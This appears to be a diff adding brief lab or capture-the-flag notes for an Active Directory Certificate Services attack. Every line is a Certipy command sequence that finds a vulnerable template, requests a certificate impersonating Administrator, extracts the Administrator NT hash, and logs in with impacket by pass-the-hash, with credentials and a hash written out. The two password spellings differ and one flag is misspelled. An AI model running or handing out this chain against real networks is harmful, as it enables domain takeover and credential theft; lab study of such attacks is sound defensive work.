@@ -1,0 +1,11 @@
+use Certipy
+find the domain and CA 
+write certipy-ad -debug find -u Bob -p 'bob1sH@cker' -dc-ip 10.53.50.14 -vulenrable -stdout 
+
+certipy-ad -debug req -u Bob -p 'b0b1sH@cker' -dc-ip 10.53.50.14 -ca CA-CYBER -template VPNuser -upn Administrator  
+
+now find the hashes 
+certipy-ad -debug auth -pfx ./administrator.pfx -u Administrator -dc-ip 10.53.50.14 -domain corp.local
+
+now connect to the machine as administrator 
+impacket-smbclient corp.local/administrator@10.53.50.14 -hashes "aad3b435b51404eeaad3b435b51404ee:a492a771ae284edd204f69987116fe4f"
